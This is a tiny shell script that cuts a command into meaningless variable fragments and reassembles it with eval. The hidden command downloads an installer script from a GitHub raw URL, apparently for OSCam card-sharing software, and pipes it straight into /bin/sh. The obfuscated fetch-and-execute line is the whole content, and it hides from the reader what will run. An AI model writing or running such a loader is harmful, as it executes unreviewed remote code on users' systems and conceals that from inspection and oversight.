z="
";Qz='/ins';Nz='-rev';Gz='serc';Rz='tall';Iz='nt.c';Mz='scam';Cz='ps:/';Ez='.git';Lz='37/o';Sz='er.s';Uz=' - |';Kz='mil2';Az='wget';Dz='/raw';Jz='om/e';Fz='hubu';Wz='n/sh';Vz=' /bi';Tz='h -O';Pz='main';Hz='onte';Bz=' htt';Oz='cam/';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz"